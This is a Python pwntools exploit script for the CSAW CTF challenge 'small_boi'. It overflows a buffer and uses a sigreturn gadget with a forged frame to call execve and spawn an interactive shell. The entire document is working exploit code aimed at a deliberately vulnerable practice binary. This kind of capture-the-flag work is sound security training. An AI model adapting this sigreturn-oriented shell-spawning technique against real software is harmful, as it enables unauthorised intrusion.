from pwn import *

target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

context.arch = 'amd64'
sigreturn = p64(0x40017c)
frame = SigreturnFrame()
frame.rip = 0x400185
frame.rax = 59
frame.rdi = 0x4001ca
frame.rsi = 0x0
frame.rdx = 0x0

payload = b"0" * 0x28
payload += sigreturn
payload += bytes(frame)[8:]
target.sendline(payload)
target.interactive()
